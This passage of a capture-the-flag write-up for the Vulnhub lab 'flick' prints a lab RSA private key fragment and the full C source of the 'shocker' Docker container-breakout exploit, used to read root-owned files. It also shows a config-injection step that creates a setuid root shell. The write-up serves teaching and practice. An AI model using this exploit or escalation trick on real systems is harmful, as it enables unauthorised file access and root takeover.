-wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
-tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
-Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
-wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
-mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
-l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
-JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
-gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
-JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
-rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
-PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
-zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
-AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
-EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
-mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
-JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
-Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
-VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
------END RSA PRIVATE KEY-----
-dean@flick:~$ 
-</code></pre>
-
-<p><img src="http://cdn.gifbay.com/2012/10/what_the_hell_just_happened-7962.gif" alt="" /></p>
-
-<p>OK, so, I&rsquo;ll put that into a file then and log in as Robin.</p>
-
-<pre><code class="bash">dean@flick:~$ ./read_docker ./ &gt; robin.priv
-dean@flick:~$ chmod 600 ./robin.priv
-dean@flick:~$ ssh -i robin.priv robin@127.0.0.1
-
- .o88o. oooo   o8o            oooo
- 888 `" `888   `"'            `888
-o888oo   888  oooo   .ooooo.   888  oooo
- 888     888  `888  d88' `"Y8  888 .8P'
- 888     888   888  888        888888.
- 888     888   888  888   .o8  888 `88b.
-o888o   o888o o888o `Y8bod8P' o888o o888o 
-
-Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com/
-
-  System information as of Wed Aug 13 00:31:14 SAST 2014
-
-  System load:  0.0               Processes:              91
-  Usage of /:   39.7% of 6.99GB   Users logged in:        1
-  Memory usage: 51%               IP address for eth0:    192.168.0.106
-  Swap usage:   1%                IP address for docker0: 172.17.42.1
-
-  Graph this data and manage this system at:
-    https://landscape.canonical.com/
-
-79 packages can be updated.
-51 updates are security updates.
-
-New release '14.04.1 LTS' available.
-Run 'do-release-upgrade' to upgrade to it.
-
-Last login: Wed Aug 13 00:16:47 2014 from 192.168.0.110
-robin@flick:~$ 
-</code></pre>
-
-<hr />
-
-<h2>Docker all the Things !</h2>
-
-<p>Robin can sudo /opt/start_apache/restart.sh without a password, as shown by running sudo -l</p>
-
-<pre><code class="bash">robin@flick:~$ sudo -l
-Matching Defaults entries for robin on this host:
-    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User robin may run the following commands on this host:
-    (root) NOPASSWD: /opt/start_apache/restart.sh
-robin@flick:~$
-</code></pre>
-
-<p>This shell script seems to restart the Apache servers when run</p>
-
-<pre><code class="bash">robin@flick:~$ sudo /opt/start_apache/restart.sh
- * Restarting web server apache2                                                                                        apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
- ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
-                                                                                                                 [ OK ]
-start_apache-8000: stopped
-start_apache-8000: started
-robin@flick:~$
-</code></pre>
-
-<p>The file cannot be viewed, as the permissions prevent it</p>
-
-<pre><code class="bash">robin@flick:~$ ls -l /opt/start_apache/
-total 8
--rwx------ 1 root root   79 Aug  4 17:04 restart.sh
--rwx------ 1 root root 2285 Aug  4 17:09 start.py
-robin@flick:~$
-</code></pre>
-
-<p>There&rsquo;s got to be another way to read that file to see what it&rsquo;s doing. Further poking around resulted in me finding out that Docker is installed (Docker is quite cool - take a look). However, as with any application, there are vulnerabilities.</p>
-
-<p>The docker version command shows us the server is running version 0.11</p>
-
-<pre><code class="bash">robin@flick:~$ docker version
-Client version: 0.11.0
-Client API version: 1.11
-Go version (client): go1.2.1
-Git commit (client): 15209c3
-Server version: 0.11.0
-Server API version: 1.11
-Git commit (server): 15209c3
-Go version (server): go1.2.1
-Last stable version: 1.1.2, please update docker
-robin@flick:~$
-</code></pre>
-
-<p>Which, according to <a href="http://blog.docker.com/2014/06/docker-container-breakout-proof-of-concept-exploit/">this site</a>, is vulnerable to a container breakout. The blog indicates that there is PoC code out in the wild - so off I went to find it. Turns out it&rsquo;s <a href="https://github.com/gabrtv/shocker">on github</a>, obviously.</p>
-
-<p>OK, so lets clone the repo to the local machine and have a look at the code</p>
-
-<pre><code class="bash">robin@flick:~$ git clone https://github.com/gabrtv/shocker
-Cloning into 'shocker'...
-remote: Counting objects: 27, done.
-remote: Total 27 (delta 0), reused 0 (delta 0)
-Unpacking objects: 100% (27/27), done.
-robin@flick:~$
-</code></pre>
-
-<pre><code class="c">/* shocker: docker PoC VMM-container breakout (C) 2014 Sebastian Krahmer
- *
- * Demonstrates that any given docker image someone is asking
- * you to run in your docker setup can access ANY file on your host,
- * e.g. dumping hosts /etc/shadow or other sensitive info, compromising
- * security of the host and any other docker VM's on it.
- *
- * docker using container based VMM: Sebarate pid and net namespace,
- * stripped caps and RO bind mounts into container's /. However
- * as its only a bind-mount the fs struct from the task is shared
- * with the host which allows to open files by file handles
- * (open_by_handle_at()). As we thankfully have dac_override and
- * dac_read_search we can do this. The handle is usually a 64bit
- * string with 32bit inodenumber inside (tested with ext4).
- * Inode of / is always 2, so we have a starting point to walk
- * the FS path and brute force the remaining 32bit until we find the
- * desired file (It's probably easier, depending on the fhandle export
- * function used for the FS in question: it could be a parent inode# or
- * the inode generation which can be obtained via an ioctl).
- * [In practise the remaining 32bit are all 0 :]
- *
- * tested with docker 0.11 busybox demo image on a 3.11 kernel:
- *
- * docker run -i busybox sh
- *
- * seems to run any program inside VMM with UID 0 (some caps stripped); if
- * user argument is given, the provided docker image still
- * could contain +s binaries, just as demo busybox image does.
- *
- * PS: You should also seccomp kexec() syscall :)
- * PPS: Might affect other container based compartments too
- *
- * $ cc -Wall -std=c99 -O2 shocker.c -static
- */
-
-#define _GNU_SOURCE
-#include &lt;stdio.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;sys/stat.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;dirent.h&gt;
-#include &lt;stdint.h&gt;
-
-struct my_file_handle {
-    unsigned int handle_bytes;
-    int handle_type;
-    unsigned char f_handle[8];
-};
-
-void die(const char *msg)
-{
-    perror(msg);
-    exit(errno);
-}
-
-void dump_handle(const struct my_file_handle *h)
-{
-    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h-&gt;handle_bytes,
-            h-&gt;handle_type);
-    for (int i = 0; i &lt; h-&gt;handle_bytes; ++i) {
-        fprintf(stderr,"0x%02x", h-&gt;f_handle[i]);
-        if ((i + 1) % 20 == 0)
-            fprintf(stderr,"\n");
-        if (i &lt; h-&gt;handle_bytes - 1)
-            fprintf(stderr,", ");
-    }
-    fprintf(stderr,"};\n");
-}
-
-int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
-{
-    int fd;
-    uint32_t ino = 0;
-    struct my_file_handle outh = {
-        .handle_bytes = 8,
-        .handle_type = 1
-    };
-    DIR *dir = NULL;
-    struct dirent *de = NULL;
-
-    path = strchr(path, '/');
-
-    // recursion stops if path has been resolved
-    if (!path) {
-        memcpy(oh-&gt;f_handle, ih-&gt;f_handle, sizeof(oh-&gt;f_handle));
-        oh-&gt;handle_type = 1;
-        oh-&gt;handle_bytes = 8;
-        return 1;
-    }
-    ++path;
-    fprintf(stderr, "[*] Resolving '%s'\n", path);
-
-    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) &lt; 0)
-        die("[-] open_by_handle_at");
-
-    if ((dir = fdopendir(fd)) == NULL)
-        die("[-] fdopendir");
-
-    for (;;) {
-        de = readdir(dir);
-        if (!de)
-            break;
-        fprintf(stderr, "[*] Found %s\n", de-&gt;d_name);
-        if (strncmp(de-&gt;d_name, path, strlen(de-&gt;d_name)) == 0) {
-            fprintf(stderr, "[+] Match: %s ino=%d\n", de-&gt;d_name, (int)de-&gt;d_ino);
-            ino = de-&gt;d_ino;
-            break;
-        }
-    }
-
-    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
-
-    if (de) {
-        for (uint32_t i = 0; i &lt; 0xffffffff; ++i) {
-            outh.handle_bytes = 8;
-            outh.handle_type = 1;
-            memcpy(outh.f_handle, &amp;ino, sizeof(ino));
-            memcpy(outh.f_handle + 4, &amp;i, sizeof(i));
-
-            if ((i % (1&lt;&lt;20)) == 0)
-                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de-&gt;d_name, i);
-            if (open_by_handle_at(bfd, (struct file_handle *)&amp;outh, 0) &gt; 0) {
-                closedir(dir);
-                close(fd);
-                dump_handle(&amp;outh);
-                return find_handle(bfd, path, &amp;outh, oh);
-            }
-        }
-    }
-
-    closedir(dir);
-    close(fd);
-    return 0;
-}
-
-int main()
-{
-    char buf[0x1000];
-    int fd1, fd2;
-    struct my_file_handle h;
-    struct my_file_handle root_h = {
-        .handle_bytes = 8,
-        .handle_type = 1,
-        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
-    };
-
-    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014             [***]\n"
-           "[***] The tea from the 90's kicks your sekurity again.     [***]\n"
-           "[***] If you have pending sec consulting, I'll happily     [***]\n"
-           "[***] forward to my friends who drink secury-tea too!      [***]\n");
-
-    // get a FS reference from something mounted in from outside
-    if ((fd1 = open("/.dockerinit", O_RDONLY)) &lt; 0)
-        die("[-] open");
-
-    if (find_handle(fd1, "/etc/shadow", &amp;root_h, &amp;h) &lt;= 0)
-        die("[-] Cannot find valid handle!");
-
-    fprintf(stderr, "[!] Got a final handle!\n");
-    dump_handle(&amp;h);
-
-    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&amp;h, O_RDONLY)) &lt; 0)
-        die("[-] open_by_handle");
-
-    memset(buf, 0, sizeof(buf));
-    if (read(fd2, buf, sizeof(buf) - 1) &lt; 0)
-        die("[-] read");
-
-    fprintf(stderr, "[!] Win! /etc/shadow output follows:\n%s\n", buf);
-
-    close(fd2); close(fd1);
-
-    return 0;
-}
-</code></pre>
-
-<p>Looks like it&rsquo;s a simple case of replacing the following line with the file to read</p>
-
-<pre><code class="c">if (find_handle(fd1, "/etc/shadow", &amp;root_h, &amp;h) &lt;= 0)
-</code></pre>
-
-<p>I thought I could be sneaky here and request /root/flag.txt, so I edited the source code, and compiled it as per the instructions</p>
-
-<pre><code class="bash">robin@flick:~$ docker build -t shocker/shocker shocker/
-Uploading context 101.4 kB
-Uploading context
-Step 0 : FROM ubuntu
- ---&gt; ba5877dc9bec
-Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
- ---&gt; Using cache
- ---&gt; fe0bdac7e278
-Step 2 : ADD . /app
- ---&gt; b1c818249f2f
-Removing intermediate container 80d78a2e42ff
-Step 3 : WORKDIR /app
- ---&gt; Running in b670431898c9
- ---&gt; a8aea5e1a755
-Removing intermediate container b670431898c9
-Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
- ---&gt; Running in a19ed14d76b6
- ---&gt; 391372de38ec
-Removing intermediate container a19ed14d76b6
-Step 5 : CMD ["./shocker"]
- ---&gt; Running in 1572b7cb39e5
- ---&gt; 6a588733f8ce
-Removing intermediate container 1572b7cb39e5
-Successfully built 6a588733f8ce
-robin@flick:~$ docker run shocker/shocker
-[***] docker VMM-container breakout Po(C) 2014             [***]
-[***] The tea from the 90's kicks your sekurity again.     [***]
-[***] If you have pending sec consulting, I'll happily     [***]
-[***] forward to my friends who drink secury-tea too!      [***]
-[*] Resolving 'root/flag.txt'
-[*] Found .
-[*] Found mnt
-[*] Found home
-[*] Found root
-[+] Match: root ino=130833
-[*] Brute forcing remaining 32bit. This can take a while...
-[*] (root) Trying: 0x00000000
-[*] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
-[*] Resolving 'flag.txt'
-[*] Found .
-[*] Found .bashrc
-[*] Found .Xauthority
-[*] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
-[*] Found flag.txt
-[+] Match: flag.txt ino=165017
-[*] Brute forcing remaining 32bit. This can take a while...
-[*] (flag.txt) Trying: 0x00000000
-[*] #=8, 1, char nh[] = {0x99, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
-[!] Got a final handle!
-[*] #=8, 1, char nh[] = {0x99, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
-[!] Win! /root/flag.txt output follows:
-Errr, you are close, but this is not the flag you are looking for.
-
-robin@flick:~$
-</code></pre>
-
-<p>Wow, 1 it worked, and 2 this is not the flag you are looking for</p>
-
-<p><img src="http://motorcycleradio.us/wp-content/uploads/2014/07/mindtrick.gif" alt="" /></p>
-
-<p>I did notice, however, that it provides a directory listing when trying to find the file requested. There&rsquo;s a folder or file called 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc. I wonder if that is either the flag, or if the flag is in it ?</p>
-
-<p>Firstly lets try requesting it as a file by changing the source code, compile and run it</p>
-
-<pre><code class="c">if (find_handle(fd1, "/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc", &amp;root_h, &amp;h) &lt;= 0)
-</code></pre>
-
-<pre><code class="bash">robin@flick:~$ docker build -t shocker/shocker shocker/
-Uploading context 101.9 kB
-Uploading context
-Step 0 : FROM ubuntu
- ---&gt; ba5877dc9bec
-Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
- ---&gt; Using cache
- ---&gt; fe0bdac7e278
-Step 2 : ADD . /app
- ---&gt; 4ccef4da8ae5
-Removing intermediate container 8cb273148a08
-Step 3 : WORKDIR /app
- ---&gt; Running in 661ce7955eae
- ---&gt; 66c9d4b419e6
-Removing intermediate container 661ce7955eae
-Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
- ---&gt; Running in 969fcb8e2910
- ---&gt; edd283652f36
-Removing intermediate container 969fcb8e2910
-Step 5 : CMD ["./shocker"]
- ---&gt; Running in bbadcbb89ef2
- ---&gt; 41afb4ce762a
-Removing intermediate container bbadcbb89ef2
-Successfully built 41afb4ce762a
-robin@flick:~$ docker run shocker/shocker
-[***] docker VMM-container breakout Po(C) 2014             [***]
-[***] The tea from the 90's kicks your sekurity again.     [***]
-[***] If you have pending sec consulting, I'll happily     [***]
-[***] forward to my friends who drink secury-tea too!      [***]
-[*] Resolving 'root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc'
-[*] Found .
-[*] Found mnt
-[*] Found home
-[*] Found root
-[+] Match: root ino=130833
-[*] Brute forcing remaining 32bit. This can take a while...
-[*] (root) Trying: 0x00000000
-[*] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
-[*] Resolving '53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc'
-[*] Found .
-[*] Found .bashrc
-[*] Found .Xauthority
-[*] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
-[+] Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc ino=138648
-[*] Brute forcing remaining 32bit. This can take a while...
-[*] (53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc) Trying: 0x00000000
-[*] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
-[!] Got a final handle!
-[*] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
-[-] read: Is a directory
-robin@flick:~$
-</code></pre>
-
-<p>It&rsquo;s a directory, so we need to know the file name. If I request a random filename, I will still get a folder listing, so changing the source code to</p>
-
-<pre><code class="c">if (find_handle(fd1, "/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt", &amp;root_h, &amp;h) &lt;= 0)
-</code></pre>
-
-<p>results in the following when compiled and run</p>
-
-<pre><code class="bash">robin@flick:~$ docker build -t shocker/shocker shocker/
-Uploading context 101.9 kB
-Uploading context
-Step 0 : FROM ubuntu
- ---&gt; ba5877dc9bec
-Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
- ---&gt; Using cache
- ---&gt; fe0bdac7e278
-Step 2 : ADD . /app
- ---&gt; 218b0633106e
-Removing intermediate container 2a354d2d7c4b
-Step 3 : WORKDIR /app
- ---&gt; Running in 957ed6b77fb3
- ---&gt; bbcee63e4d51
-Removing intermediate container 957ed6b77fb3
-Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
- ---&gt; Running in e283824b6a69
- ---&gt; 7e02f111f1eb
-Removing intermediate container e283824b6a69
-Step 5 : CMD ["./shocker"]
- ---&gt; Running in ef8d73127be9
- ---&gt; f532278bdca2
-Removing intermediate container ef8d73127be9
-Successfully built f532278bdca2
-robin@flick:~$ docker run shocker/shocker
-[***] docker VMM-container breakout Po(C) 2014             [***]
-[***] The tea from the 90's kicks your sekurity again.     [***]
-[***] If you have pending sec consulting, I'll happily     [***]
-[***] forward to my friends who drink secury-tea too!      [***]
-[*] Resolving 'root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt'
-[*] Found .
-[*] Found mnt
-[*] Found home
-[*] Found root
-[+] Match: root ino=130833
-[*] Brute forcing remaining 32bit. This can take a while...
-[*] (root) Trying: 0x00000000
-[*] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
-[*] Resolving '53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt'
-[*] Found .
-[*] Found .bashrc
-[*] Found .Xauthority
-[*] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
-[+] Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc ino=138648
-[*] Brute forcing remaining 32bit. This can take a while...
-[*] (53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc) Trying: 0x00000000
-[*] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
-[*] Resolving 'random.txt'
-[*] Found .
-[*] Found real_flag.txt
-[*] Found ..
-[*] Brute forcing remaining 32bit. This can take a while...
-[-] Cannot find valid handle!: Bad file descriptor
-robin@flick:~$
-</code></pre>
-
-<p>Our flag is actually called real_flag.txt, so a quick edit, compile and run, and we have the flag !</p>
-
-<pre><code class="c">if (find_handle(fd1, "/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt", &amp;root_h, &amp;h) &lt;= 0)
-</code></pre>
-
-<pre><code class="bash">robin@flick:~$ docker build -t shocker/shocker shocker/
-Uploading context 101.9 kB
-Uploading context
-Step 0 : FROM ubuntu
- ---&gt; ba5877dc9bec
-Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
- ---&gt; Using cache
- ---&gt; fe0bdac7e278
-Step 2 : ADD . /app
- ---&gt; c70bb87b476f
-Removing intermediate container 9dc4cbb04db9
-Step 3 : WORKDIR /app
- ---&gt; Running in 77dfcfa2bdd0
- ---&gt; e376b09e495d
-Removing intermediate container 77dfcfa2bdd0
-Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
- ---&gt; Running in 6d5d7089896d
- ---&gt; f3140f828bfc
-Removing intermediate container 6d5d7089896d
-Step 5 : CMD ["./shocker"]
- ---&gt; Running in 481824a260cb
- ---&gt; 2c7032dcfbd2
-Removing intermediate container 481824a260cb
-Successfully built 2c7032dcfbd2
-robin@flick:~$ docker run shocker/shocker
-[***] docker VMM-container breakout Po(C) 2014             [***]
-[***] The tea from the 90's kicks your sekurity again.     [***]
-[***] If you have pending sec consulting, I'll happily     [***]
-[***] forward to my friends who drink secury-tea too!      [***]
-[*] Resolving 'root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt'
-[*] Found .
-[*] Found mnt
-[*] Found home
-[*] Found root
-[+] Match: root ino=130833
-[*] Brute forcing remaining 32bit. This can take a while...
-[*] (root) Trying: 0x00000000
-[*] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
-[*] Resolving '53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt'
-[*] Found .
-[*] Found .bashrc
-[*] Found .Xauthority
-[*] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
-[+] Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc ino=138648
-[*] Brute forcing remaining 32bit. This can take a while...
-[*] (53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc) Trying: 0x00000000
-[*] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
-[*] Resolving 'real_flag.txt'
-[*] Found .
-[*] Found real_flag.txt
-[+] Match: real_flag.txt ino=165015
-[*] Brute forcing remaining 32bit. This can take a while...
-[*] (real_flag.txt) Trying: 0x00000000
-[*] #=8, 1, char nh[] = {0x97, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
-[!] Got a final handle!
-[*] #=8, 1, char nh[] = {0x97, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
-[!] Win! /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc output follows:
-Congrats!
-
-You have completed 'flick'! I hope you have enjoyed doing it as much as I did creating it
-
-ciao for now!
-@leonjza
-
-robin@flick:~$
-</code></pre>
-
-<p><img src="http://stream1.gifsoup.com/webroot/animatedgifs/1024795_o.gif" alt="" /></p>
-
-<hr />
-
-<h2>I&rsquo;m Always After the Bonus Points</h2>
-
-<p>So, on Vulnhub, the text for Flick has this line in it</p>
-
-<pre><code class="text">As a bonus, can you get root command execution?
-</code></pre>
-
-<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/challenge_accepted.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/challenge_accepted.jpg" alt="challenge_accepted" /></a></p>
-
-<p>Using the aforementioned Docker Container Breakout vulnerability, I read the contents of /opt/start_apache/restart.sh</p>
-
-<pre><code class="bash">#!/bin/sh
-/usr/sbin/service apache2 restart
-/usr/bin/supervisorctl restart all
-</code></pre>
-
-<p>OK, so, it&rsquo;s restarting apache and restarting all processes controlled by Supervisord. Supervisord stores config files in /etc/supervisor/conf.d. Using the Docker vuln to blind enumerate the files, I located /etc/supervisor/conf.d/start_apache.conf which I read</p>
-
-<pre><code class="text">[program:start_apache]
-command=/opt/start_apache/start.py
-process_name = %(program_name)s-80%(process_num)02d
-stdout_logfile = /var/log/start_apache-80%(process_num)02d.log
-stdout_logfile_maxbytes=100MB
-stdout_logfile_backups=10
-numprocs=1
-directory=/opt/start_apache
-stopwaitsecs=1
-user=root
-stopasgroup=true
-</code></pre>
-
-<p>/usr/bin/supervisorctl restart all is running /opt/start_apache/start.py. That&rsquo;s the next file I read with the Docker vuln</p>
-
-<pre><code class="python">#!/usr/bin/python
-'''
-    Simple socket server using threads. Used in the flick CTF
-    Credit: http://www.binarytides.com/python-socket-server-code-example/
-'''
-
-import socket
-import os, sys, signal
-from thread import *
-import subprocess
-
-# import the directory containing our config, and prevent the bytcode writes
-sys.dont_write_bytecode = True
-
-# see if /tmp has a configuration to load.
-# Debugging purposes only!!!
-if os.path.isfile('/tmp/config.py'):
-    sys.path.insert(0, '/tmp')
-else:
-    sys.path.insert(0, '/etc')
-
-# import the config
-from config import config
-
-HOST = ''   # Symbolic name meaning all available interfaces
-PORT = 8881 # Arbitrary non-privileged port
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-#Bind socket to local host and port
-try:
-    s.bind((HOST, PORT))
-except socket.error as msg:
-    print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
-    sys.exit()
-
-#Start listening on socket
-s.listen(10)
-
-#Function for handling connections. This will be used to create threads
-def clientthread(conn):
-
-    #Sending message to connected client
-    conn.send('Welcome to the admin server. A correct password will \'flick\' the switch and open a new door:\n&gt; ') #send only takes string
-
-    #infinite loop so that function do not terminate and thread do not end.
-    while True:
-
-        #Receiving from client
-        data = conn.recv(1024)
-        reply = 'OK: ' + data
-        if not data:
-            break
-
-    # check if the password is tabupJievas8Knoj
-    if data.strip() == 'tabupJievas8Knoj':
-        return_code = subprocess.call(config['command'], shell=True)
-        if return_code == 0:
-            reply += '\nAccepted! The door should be open now :poolparty:\n'
-        else:
-            reply += '\nAccepted, but it doesn\'t look like the door opened :&lt;\n'
-
-    # add the prompt again
-    reply += '\n&gt; '
-
-        conn.sendall(reply)
-    #came out of loop
-    conn.close()
-
-#now keep talking with the client
-while 1:
-    #wait to accept a connection - blocking call
-    conn, addr = s.accept()
-
-    #start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
-    start_new_thread(clientthread ,(conn,))
-
-s.close()
-</code></pre>
-
-<p>This script is the script that provides the service found on port 8881, and seems to get it&rsquo;s config from /tmp/config.py, and if that doesn&rsquo;t exist, /etc/config.py. I read /etc/config.py to get an idea of the syntax</p>
-
-<pre><code class="python">config = {
-    'command': 'service apache2 restart'
-}
-</code></pre>
-
-<p>Pretty simple. I can use this to execute a set of commands by creating /tmp/config.py with the following contents - this will take a copy of /bin/sh and put it in /tmp called rootshell, then set the SUID bit.</p>
-
-<pre><code class="python">config = {
-    'command': 'cp /bin/sh /tmp/rootshell &amp;&amp; chmod 4777 /tmp/rootshell'
-}
-</code></pre>
-
-<p>Now, when I run the /opt/start_apache/restart.sh script, /opt/start_apache/start.py will be run, which will result in /tmp/config.py being read instead of /etc/config.py.</p>
-
-<pre><code class="bash">robin@flick:~$ sudo /opt/start_apache/restart.sh
- * Restarting web server apache2                                                                                                                                              apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
- ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
-                                                                                                                                                                       [ OK ]
-start_apache-8000: stopped
-start_apache-8000: started
-robin@flick:~$
-</code></pre>
-
-<p>Now, we know that typing the correct password runs the command - we know this firstly from the source code, and secondly because we used it to start the web server right at the beginning. All I should need to do is connect to port 8881, and type the correct password. It should then run my malicious command.</p>
-
-<pre><code class="bash">root@pwk:~# nc 192.168.0.106 8881
-Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
-&gt; tabupJievas8Knoj
-OK: tabupJievas8Knoj
-
-Accepted! The door should be open now :poolparty:
-
-&gt;
-</code></pre>
-
-<p>Fingers crossed there&rsquo;s a rootshell file in /tmp</p>
-
-<pre><code class="bash">robin@flick:~$ ls -l /tmp
-total 112
--rwxrwxrwx 1 robin robin     82 Aug 12 13:59 config.py
--rwsrwxrwx 1 root  root  109768 Aug 13 01:08 rootshell
-robin@flick:~$
-</code></pre>
-
-<p>Well, what do you know - it worked ! Running /tmp/rootshell drops us to a root shell, where we can properly read the flag, and put our public key into authorized_keys.</p>
-
-<pre><code class="bash">robin@flick:~$ /tmp/rootshell
-# id
-uid=1000(robin) gid=1000(robin) euid=0(root) groups=0(root),999(docker),1000(robin)
-# 
-</code></pre>
-
-<p>And for completeness, an SSH session as root.</p>
-
-<pre><code class="bash">root@pwk:~# ssh root@192.168.0.106
-
- .o88o. oooo   o8o            oooo
- 888 `" `888   `"'            `888
-o888oo   888  oooo   .ooooo.   888  oooo
- 888     888  `888  d88' `"Y8  888 .8P'
- 888     888   888  888        888888.
- 888     888   888  888   .o8  888 `88b.
-o888o   o888o o888o `Y8bod8P' o888o o888o 
-
